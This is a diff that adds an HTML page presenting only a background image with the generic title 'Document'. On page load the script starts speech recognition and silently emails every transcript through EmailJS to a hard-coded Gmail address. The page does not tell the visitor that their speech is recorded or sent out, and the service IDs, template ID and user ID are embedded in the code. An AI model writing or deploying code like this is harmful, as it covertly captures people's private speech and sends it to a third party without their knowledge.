@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+<body style="background-image: url('channels4_profile.jpg'); background-size: cover;">
+    <p id="output"></p>
+
+    <script>
+        emailjs.init("your_user_id");
+        // Check if browser supports SpeechRecognition
+        if ('SpeechRecognition' in window || 'webkitSpeechRecognition' in window) {
+            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+            const recognition = new SpeechRecognition();
+
+            // Set recognition parameters
+            recognition.lang = 'en-US'; // Set the language
+
+            const output = document.getElementById('output');
+
+            recognition.onresult = (event) => {
+                const transcript = event.results[0][0].transcript;
+                sendEmail(transcript); // Pass transcript to sendEmail function
+            };
+
+
+            recognition.onerror = (event) => {
+                output.textContent = 'Error occurred in recognition: ' + event.error;
+            };
+
+            // Start recognition when the page loads
+            recognition.start();
+        } else {
+            // Speech recognition not supported
+            output.textContent = 'Speech recognition not supported in this browser.';
+        }
+        
+        // Function to send email
+        function sendEmail(message) {
+            // Replace these values with your own
+            var serviceID = 'service_y3uo009';
+            var templateID = 'template_3phow24';
+            var userID = 'KXkZ3vo5OliMHXB13';
+
+            // Prepare email parameters
+            var templateParams = {
+                to_email: 'rickandmortysancheztagpuno@gmail.com',
+                message: message
+            };
+
+            // Send the email
+            emailjs.send(serviceID, templateID, templateParams, userID)
+                .then(function(response) {
+                    console.log('Email sent successfully', response);
+                    alert('Refresh the page')
+                }, function(error) {
+                    console.error('Email sending failed', error);
+                });
+        }
+    </script>
+    
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-position: center;
+        }
+        
+        #output {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            text-align: center;
+        }
+    </style>
+</body>
+</html>
